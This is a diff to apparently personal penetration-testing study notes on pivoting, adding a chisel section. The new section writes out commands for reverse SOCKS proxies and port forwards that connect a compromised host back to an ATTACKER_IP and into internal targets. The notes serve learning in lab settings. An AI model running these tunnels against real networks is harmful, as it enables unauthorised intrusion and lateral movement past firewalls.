@@ -143,7 +143,7 @@ Also, you must have noticed that we are not using a port to connect with the pro
 
 
 proxychains.conf
-------------------
+=================
 
 There are 2 things that are worth noting in this config file:
 	- "ProxyList" section
@@ -160,7 +160,7 @@ Other things to note about proxychains:
 
 
 FoxyProxy
------------
+===========
 
 About browsing using proxy... this can be a great tool with ease of access.
 
@@ -240,7 +240,7 @@ Note: Modern Windows comes with an inbuilt SSH client available by default. This
 
 
 plink.exe
------------
+===========
 
 Plink.exe is nothing but an alternative tool for openssh on windows. We can get the reverse ssh shells in the very same way we get it in linux.
 	- In short it is a cli version of putty on windows...
@@ -269,7 +269,7 @@ Note: Plink is notorious for going out of date quickly, which often results in f
 
 
 Socat
--------
+=======
 
 For pivoting:
 	- Attacker machine
@@ -278,7 +278,7 @@ For pivoting:
 
 
 
-- To my fav tools, socat.
+- To my fav tool, socat.
 
 - No intro needed.
 
@@ -349,14 +349,89 @@ Optional: Try to create the same process using an SSL tunnel.
 
 
 Chisel
---------
+=======
 
 You can find the chisel's release binaries(static) on it's github here: https://github.com/jpillora/chisel/releases
 
-	- To be done someday later.
+- Available for both linux and windows
+- This doesn't require the ssh access on the target machine but works same as ssh port forwarding.
+	- Make sure you've chisel available on the target machine before pivoting to another
 
+- Chisel's binary has 2 modes: client & server
+
+	`chisel client --help`
+	`chisel servers --help`
+
+Reverse SOCKS Proxy
+--------------------
+
+- Means server is going to be our attacker machine (chisel server is going to be executed on local machine) and client is going to be the connecting target.
+
+	./chisel server -p LISTEN_PORT --reverse &
+
+	On the client machine:
+
+	./chisel client ATTACKER_IP:LISTEN_PORT R:socks &
+
+Note: R:socks is to tell chisel client to establish a `R`everse connection using Socks proxy.
+	- Also despite of using some other port for getting a reverse connection another port is opened for data transfer.
+
+Forward SOCKS Proxy
+--------------------
+
+- They are rarer than the reverse proxies as firewall as there are more restrictions on inbound traffic (ingress firewalls; connections made to the server) than on outbound traffic(egress firewalls; traffic going out of the server).
+
+- The process here is just reversed
+	- Client on the attacker machine:
+
+		./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+
+	- Server on the target machine:
+
+		./chisel server -p LISTEN_PORT --socks5
+
+Note: In the client command here, PROXY_PORT is the port that will be opened for the proxy.
+	- For example, ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.
+
+Proxychains Reminder
+---------------------
+
+- When sending data through either of these proxies, we would need to set the port in our proxychains.conf file(proxychains tool).
+	- As chisel uses a SOCKS5 proxy, we will also need to change the start of the line in configuration file from socks4 to socks5.
+
+
+Remote Port Forward
+---------------------
+
+- So earlier we setup remote socks proxy which tells chisel to establish a connection through a proxy. Here we are specifying it for port forward.
+
+	- The server side it's gonna be same (attacker machine):
+		./chisel server -p LISTEN_PORT --reverse &
+
+	- On the client side, we are going to change it a bit:
+		./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+
+Note: The attacking IP is our own machine's ip. Client side command is executing on the compromised machine's ip. And the TARGET_IP above is for the target machine in the network.
+
+Local Port Forward
+--------------------
+
+- Similar to a bind connection we are going to connect to the target machine as a client to server.
+
+	- In this case the server command on the client machine.
+
+		./chisel server -p LISTEN_PORT
+
+	- On the compromise host:
+		./chisel client ATTACKER_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+
+- For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
+	./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
+
+- You can kill the backgrounded processes by fg-ing them or using jobs command to see a list and then use kill on each job listed.
+ 
 sshuttle
----------
+=========
 
 - This tool will only work on linux machines...
 
